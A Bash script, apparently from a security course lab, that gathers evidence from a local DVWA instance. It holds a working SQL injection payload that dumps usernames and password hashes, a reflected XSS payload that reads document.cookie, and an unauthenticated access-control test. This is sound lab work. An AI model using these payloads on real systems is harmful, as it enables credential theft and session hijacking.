#!/usr/bin/env bash
# Captura evidencia manual de las tres vulnerabilidades de la parte 1.
# No modifica datos: solo lee (SQLi/XSS) y lee el endpoint roto de authbypass.
set -euo pipefail

ROOT=$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)
LAB="$ROOT/.lab"
OUT="$ROOT/parte1/evidence"
BASE=${DVWA_URL:-http://127.0.0.1:8081}

[ -f "$LAB/dvwa-session.env" ] || {
  echo "falta .lab/dvwa-session.env; ejecuta lab-up.sh" >&2; exit 1; }
# shellcheck disable=SC1091
. "$LAB/dvwa-session.env"
mkdir -p "$OUT"

SQLI_PAYLOAD="1' UNION SELECT user, password FROM users -- -"
XSS_PAYLOAD='<script>alert(document.cookie)</script>'

# 1. SQL Injection
{
  echo "# SQL Injection (DVWA 2.5, seguridad=low)"
  echo "# Endpoint: GET /vulnerabilities/sqli/?id=...&Submit=Submit"
  echo "# Payload : $SQLI_PAYLOAD"
  echo
  curl -sS -G -H "Cookie: $DVWA_COOKIE" "$BASE/vulnerabilities/sqli/" \
    --data-urlencode "id=$SQLI_PAYLOAD" --data-urlencode 'Submit=Submit' \
    -o "$OUT/manual-sqli.html"
  python3 - "$OUT/manual-sqli.html" <<'PY'
import re, sys
html = open(sys.argv[1], encoding="utf-8", errors="replace").read()
for block in re.findall(r"<pre>(.*?)</pre>", html, re.S):
    text = re.sub(r"<[^>]+>", " | ", block)
    text = re.sub(r"\s+", " ", text).strip(" |")
    if "First name" in text:
        print(text)
PY
} > "$OUT/manual-sqli.txt"

# 2. XSS reflejado
{
  echo "# Cross-Site Scripting reflejado (DVWA 2.5, seguridad=low)"
  echo "# Endpoint: GET /vulnerabilities/xss_r/?name=..."
  echo "# Payload : $XSS_PAYLOAD"
  echo
  curl -sS -G -H "Cookie: $DVWA_COOKIE" "$BASE/vulnerabilities/xss_r/" \
    --data-urlencode "name=$XSS_PAYLOAD" -o "$OUT/manual-xss.html"
  grep -n -F "$XSS_PAYLOAD" "$OUT/manual-xss.html" || true
  echo
  echo "# El servidor devuelve la cabecera X-XSS-Protection: 0"
  curl -sS -D - -o /dev/null -G -H "Cookie: $DVWA_COOKIE" \
    "$BASE/vulnerabilities/xss_r/" --data-urlencode "name=test" \
    | grep -i '^x-xss-protection' || true
} > "$OUT/manual-xss.txt"

# 3. Broken Access Control / IDOR (sin cookie)
{
  echo "# Broken Access Control (DVWA 2.5, seguridad=low)"
  echo "# Endpoint: GET /vulnerabilities/authbypass/get_user_data.php"
  echo "# Petición SIN cookie de sesión:"
  echo
  curl -sS -D "$OUT/manual-authbypass.headers" \
    "$BASE/vulnerabilities/authbypass/get_user_data.php" \
    -o "$OUT/manual-authbypass.json"
  cat "$OUT/manual-authbypass.headers"
  echo
  cat "$OUT/manual-authbypass.json"
  echo
  echo
  echo "# change_user_details.php tampoco exige sesión ni rol admin (seguridad=low):"
  grep -nE "dvwaPageStartup|REQUEST_METHOD|UPDATE users" \
    "$LAB/dvwa/vulnerabilities/authbypass/change_user_details.php" || true
} > "$OUT/manual-authbypass.txt"

echo "[evidence] generado en $OUT"
ls -1 "$OUT"/manual-* | sed "s|$ROOT/||"
